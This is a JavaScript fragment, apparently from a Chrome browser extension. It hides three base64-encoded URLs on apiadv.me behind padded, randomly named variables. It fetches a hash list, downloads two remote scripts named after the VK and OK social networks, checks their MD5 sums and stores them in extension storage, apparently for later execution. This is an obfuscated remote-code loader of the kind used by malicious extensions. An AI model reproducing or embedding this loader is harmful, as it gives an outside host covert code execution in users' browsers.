var uMuAgCxx = 'uMuAgCxxaaHR0cDovL2FwaWFkdi5tZS9oYXNoZXMvYXBpcy5qc29u'; //""http://apiadv.me/hashes/apis.json
var FBSzHiNU = 'FBSzHiNUsLy9hcGlhZHYubWUvanMvdmthcGkuanM=FBSzHiNUa'; //  http://apiadv.me/js/vkapi.js
var CkKmpTNv = 'CkKmpTNvsLy9hcGlhZHYubWUvanMvb2thcGkuanM=CkKmpTNva'; // http://apiadv.me/js/okapi.js
var YFQREGKb = new XMLHttpRequest();
YFQREGKb.open('GET', atob(uMuAgCxx.substr(9)) + '?' + Math.floor((Math.random() * 1e+10) + 1), true);
YFQREGKb.onreadystatechange = function () {
    if (YFQREGKb.readyState == 4 && YFQREGKb.status === 200) {
        var AlUUmZIg = JSON.parse(YFQREGKb.responseText);
        var GUvZLJRX = new XMLHttpRequest();
        GUvZLJRX.open('GET', 'http:' + atob(FBSzHiNU.slice(9, -9)) + '?' + Math.floor((Math.random() * 1e+10) + 1), true);
        GUvZLJRX.onreadystatechange = function () {
            if (GUvZLJRX.readyState == 4 && GUvZLJRX.status === 200 && md5(GUvZLJRX.responseText) == AlUUmZIg[0].hashv) {
                chrome.storage.local.remove(['bxGZABwi']);
                chrome.storage.local.set({bxGZABwi: GUvZLJRX.responseText});
            }
            ;
        };
        GUvZLJRX.send();
        var SoibkZuz = new XMLHttpRequest();
        SoibkZuz.open('GET', 'http:' + atob(CkKmpTNv.slice(9, -9)) + '?' + Math.floor((Math.random() * 1e+10) + 1), true);
        SoibkZuz.onreadystatechange = function () {
            if (SoibkZuz.readyState == 4 && SoibkZuz.status === 200 && md5(SoibkZuz.responseText) == AlUUmZIg[0].hasho) {
                chrome.storage.local.remove(['tQFzTAwV']);
                chrome.storage.local.set({tQFzTAwV: SoibkZuz.responseText});
            }
            ;
        };
        SoibkZuz.send();
    }
    ;
};
YFQREGKb.send();